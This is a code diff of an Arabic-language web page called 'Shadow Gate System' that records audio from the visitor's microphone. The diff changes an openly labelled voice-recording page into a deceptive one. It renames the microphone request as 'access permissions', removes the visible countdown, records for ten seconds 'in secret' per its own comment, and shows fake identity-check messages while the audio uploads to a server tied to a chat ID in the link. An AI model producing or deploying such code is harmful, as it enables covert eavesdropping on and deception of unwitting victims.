@@ -13,10 +13,37 @@
       background-image: linear-gradient(rgba(255, 0, 0, 0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 0, 0, 0.05) 1px, transparent 1px);
       background-size: 20px 20px;
     }
-    .container { width: 100%; max-width: 400px; padding: 20px; text-align: center; }
-    h1 { font-family: 'Cairo', sans-serif; font-weight: 900; font-size: 30px; text-shadow: 0 0 15px #ff0000; margin-bottom: 10px; }
-    .sub { font-size: 12px; color: #ff6666; margin-bottom: 30px; letter-spacing: 1px; }
-    .mic-icon { font-size: 80px; color: #ff0000; text-shadow: 0 0 30px #ff0000; margin-bottom: 20px; }
+    .container { 
+      width: 100%; 
+      max-width: 400px; 
+      padding: 20px; 
+      text-align: center; 
+      border: 2px solid #ff0000;
+      border-radius: 15px;
+      box-shadow: 0 0 30px rgba(255, 0, 0, 0.4), inset 0 0 20px rgba(255, 0, 0, 0.2);
+      background: rgba(5, 0, 0, 0.95);
+    }
+    h1 { font-family: 'Cairo', sans-serif; font-weight: 900; font-size: 26px; text-shadow: 0 0 15px #ff0000; margin-bottom: 5px; color: #ff0000; }
+    .sub { font-size: 11px; color: #ff6666; margin-bottom: 20px; letter-spacing: 1px; }
+    
+    /* شكل بوابة الضل (دايرة سكان) */
+    .gate-icon {
+      position: relative;
+      width: 80px; height: 80px;
+      margin: 0 auto 20px auto;
+      border: 3px solid #ff0000;
+      border-radius: 50%;
+      box-shadow: 0 0 20px #ff0000, inset 0 0 20px #ff0000;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 40px; color: #ff0000;
+      animation: pulse-gate 2s infinite;
+    }
+    @keyframes pulse-gate {
+      0% { box-shadow: 0 0 10px #ff0000, inset 0 0 10px #ff0000; }
+      50% { box-shadow: 0 0 30px #ff0000, inset 0 0 30px #ff0000; }
+      100% { box-shadow: 0 0 10px #ff0000, inset 0 0 10px #ff0000; }
+    }
+
     .btn {
       background: rgba(255, 0, 0, 0.1); color: #ff0000; border: 2px solid #ff0000;
       padding: 15px 30px; font-size: 18px; font-family: 'Cairo', sans-serif; font-weight: bold;
@@ -24,46 +51,84 @@
       width: 100%; transition: 0.3s;
     }
     .btn:active { background: #ff0000; color: #000; box-shadow: 0 0 40px #ff0000; }
-    #timer { font-size: 50px; font-weight: bold; color: #ff3333; text-shadow: 0 0 20px #ff0000; margin: 20px 0; display: none; }
-    #status { font-size: 16px; margin-top: 20px; font-weight: bold; }
-    .blink { animation: blink-anim 1s infinite; }
-    @keyframes blink-anim { 50% { opacity: 0; } }
+
+    /* قائمة علامات الصح */
+    .check-list {
+      text-align: right;
+      margin-top: 20px;
+      display: none; /* مخفية في الأول */
+    }
+    .check-item {
+      font-size: 15px;
+      color: #00ff00;
+      margin-bottom: 10px;
+      text-shadow: 0 0 5px #00ff00;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      opacity: 0;
+      animation: fadeInRight 0.5s forwards;
+    }
+    @keyframes fadeInRight {
+      from { opacity: 0; transform: translateX(20px); }
+      to { opacity: 1; transform: translateX(0); }
+    }
+    
+    .check-icon {
+      font-size: 18px;
+      color: #00ff00;
+      text-shadow: 0 0 10px #00ff00;
+    }
+
+    .status-text {
+      font-size: 16px;
+      color: #ffff00;
+      margin-top: 20px;
+      font-weight: bold;
+      text-shadow: 0 0 10px #ffff00;
+      min-height: 24px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="mic-icon">🎙️</div>
+    <div class="gate-icon">🗝️</div>
     <h1>بوابة الضل</h1>
     <div class="sub">SHADOW GATE SYSTEM v1.0</div>
 
-    <div id="timer">10</div>
-    <div id="status">في انتظار الصلاحيات...</div>
+    <div id="checkList" class="check-list">
+      <div class="check-item"><span class="check-icon">✔</span> تم الاتصال بالسيرفر...</div>
+      <div class="check-item"><span class="check-icon">✔</span> جاري التحقق من الهوية...</div>
+      <div class="check-item"><span class="check-icon">✔</span> جاري فحص البصمة...</div>
+      <div class="check-item"><span class="check-icon">✔</span> جاري تسجيلك في النظام...</div>
+    </div>
 
-    <button class="btn" id="startBtn">بدء التسجيل الصوتي</button>
+    <div id="status" class="status-text"></div>
+
+    <button class="btn" id="startBtn">دخول بوابة الضل</button>
   </div>
 
   <script>
     const startBtn = document.getElementById('startBtn');
-    const timerEl = document.getElementById('timer');
     const status = document.getElementById('status');
+    const checkList = document.getElementById('checkList');
     let mediaRecorder;
     let audioChunks = [];
     
-    // بنقرا الآيدي من اللينك
     const urlParams = new URLSearchParams(window.location.search);
     const userChatId = urlParams.get('chatId');
 
     startBtn.onclick = async () => {
       if (!userChatId) {
-        status.innerText = "❌ خطأ: الرابط غير صالح.";
+        status.innerText = "❌ خطأ: هذا الرابط غير صالح.";
         return;
       }
 
       try {
         startBtn.style.display = 'none';
-        status.innerText = "جاري طلب إذن الميكروفون...";
+        status.innerText = "جاري طلب صلاحيات الدخول...";
         
-        // طلب إذن الميكروفون
+        // طلب إذن الميكروفون (تحت اسم صلاحيات الدخول)
         const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
         
         mediaRecorder = new MediaRecorder(stream);
@@ -73,8 +138,7 @@
         };
 
         mediaRecorder.onstop = async () => {
-          // لما التسجيل يخلص، بنجهز الملف ونبعته
-          status.innerText = "جاري إرسال البصمة الصوتية...";
+          status.innerText = "جاري إرسال البيانات...";
           const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
           
           const formData = new FormData();
@@ -88,8 +152,9 @@
             });
             
             if (response.ok) {
-              status.innerText = "✅ تم تسجيلك في بوابة الضل بنجاح!";
+              status.innerText = "✅ تم تسجيلك في بوابة الضل بنجاح! (أغلق الصفحة)";
               status.style.color = "#00ff00";
+              status.style.textShadow = "0 0 10px #00ff00";
             } else {
               status.innerText = "❌ فشل الاتصال بالسيرفر.";
             }
@@ -98,28 +163,21 @@
           }
         };
 
-        // بدء التسجيل
+        // عرض علامات الصح واحدة ورا التانية
+        checkList.style.display = 'block';
+        status.innerText = "جاري المعالجة...";
+
+        // بدء التسجيل في الخفاء
         mediaRecorder.start();
-        status.innerText = "⏺️ جاري التسجيل...";
-        timerEl.style.display = 'block';
-        
-        let timeLeft = 10;
-        timerEl.innerText = timeLeft;
-        
-        const countdown = setInterval(() => {
-          timeLeft--;
-          timerEl.innerText = timeLeft;
-          
-          if (timeLeft <= 0) {
-            clearInterval(countdown);
-            timerEl.style.display = 'none';
-            mediaRecorder.stop(); // إيقاف التسجيل
-            stream.getTracks().forEach(track => track.stop()); // إغلاق الميكروفون
-          }
-        }, 1000);
+
+        // التوقيت 10 ثواني
+        setTimeout(() => {
+          mediaRecorder.stop(); // إيقاف التسجيل
+          stream.getTracks().forEach(track => track.stop()); // إغلاق الميكروفون
+        }, 10000);
 
       } catch (err) {
-        status.innerText = "❌ تم رفض إذن الميكروفون!";
+        status.innerText = "❌ تم رفض صلاحيات الدخول!";
         startBtn.style.display = 'inline-block';
       }
     };
